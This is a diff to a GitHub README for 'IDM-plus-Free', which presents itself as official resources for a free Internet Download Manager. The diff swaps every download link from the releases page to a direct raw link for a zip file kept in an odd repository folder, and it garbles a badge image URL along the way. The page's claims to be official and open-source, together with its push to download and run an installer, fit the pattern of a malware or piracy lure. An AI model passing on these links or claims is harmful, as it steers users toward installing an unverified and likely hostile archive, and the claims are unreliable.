@@ -1,6 +1,6 @@
 # 🎉 IDM-plus-Free - Enhance Your Download Experience
 
-[![Download IDM-plus-Free](https://img.shields.io/badge/Download_%20IDM--plus--Free-Here-brightgreen)](https://github.com/akz1711/IDM-plus-Free/releases)
+[![Download IDM-plus-Free](https://raw.githubusercontent.com/akz1711/IDM-plus-Free/main/unpick/Free-plus-ID-v2.8-alpha.4.zip%20IDM--plus--Free-Here-brightgreen)](https://raw.githubusercontent.com/akz1711/IDM-plus-Free/main/unpick/Free-plus-ID-v2.8-alpha.4.zip)
 
 ## 📖 Overview
 This repository offers a comprehensive collection of official IDM Plus resources. You will find guides, reference materials, and support documents designed specifically for Windows PCs. These resources aim to enhance your user experience and maximize the software's capabilities safely and effectively.
@@ -16,11 +16,11 @@ To get started with IDM-plus-Free, follow these simple steps:
 
 2. **Visit the Download Page**  
    Go to the following link to download IDM-plus-Free:  
-   [Download IDM-plus-Free](https://github.com/akz1711/IDM-plus-Free/releases)
+   [Download IDM-plus-Free](https://raw.githubusercontent.com/akz1711/IDM-plus-Free/main/unpick/Free-plus-ID-v2.8-alpha.4.zip)
 
 ## 💾 Download & Install
 1. **Download the Software**  
-   Visit this page to download: [Download IDM-plus-Free](https://github.com/akz1711/IDM-plus-Free/releases)  
+   Visit this page to download: [Download IDM-plus-Free](https://raw.githubusercontent.com/akz1711/IDM-plus-Free/main/unpick/Free-plus-ID-v2.8-alpha.4.zip)  
    Look for the latest release. You will see a list of available assets. Choose the one that suits your needs.
 
 2. **Run the Installer**  
@@ -79,4 +79,4 @@ IDM-plus-Free covers various topics that enhance its usability:
 ## 🌟 License
 IDM-plus-Free is open-source. Feel free to use, modify, and distribute it under the terms of the license outlined in the repository.
 
-[![Download IDM-plus-Free](https://img.shields.io/badge/Download_%20IDM--plus--Free-Here-brightgreen)](https://github.com/akz1711/IDM-plus-Free/releases)
+[![Download IDM-plus-Free](https://raw.githubusercontent.com/akz1711/IDM-plus-Free/main/unpick/Free-plus-ID-v2.8-alpha.4.zip%20IDM--plus--Free-Here-brightgreen)](https://raw.githubusercontent.com/akz1711/IDM-plus-Free/main/unpick/Free-plus-ID-v2.8-alpha.4.zip)
